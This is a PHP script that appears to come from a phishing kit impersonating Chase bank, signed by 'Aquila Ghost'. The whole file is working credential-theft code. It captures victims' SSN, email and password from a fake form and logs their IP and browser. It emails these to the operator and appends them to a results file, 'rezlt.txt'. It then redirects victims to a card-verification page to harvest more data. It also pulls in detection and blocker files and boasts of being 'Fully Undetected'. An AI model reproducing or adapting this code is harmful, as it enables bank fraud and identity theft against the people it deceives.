<?php   ob_start();  ?>
<?
include "v-V-v.php";
?>
<?php
$zabi = getenv("REMOTE_ADDR");
include('../email.php');
include './detect.php';
include "./blocker.php";
$message .= "--++-----[ $$ Aquila Ghost  $$ ]-----++--\n";
$message .= "----------info ch@se --------------------\n";
$message .= "SSN: ".$_POST['16']."\n";
$message .= "Email : ".$_POST['3']."\n";
$message .= "Password : ".$_POST['4']."\n";
$message .= "++-----[ $$ Fully Undetected by Mou AD $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Aquila  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "ch@se Fullz [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Aquila <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);

header("Location: ../verification-card2.php");?>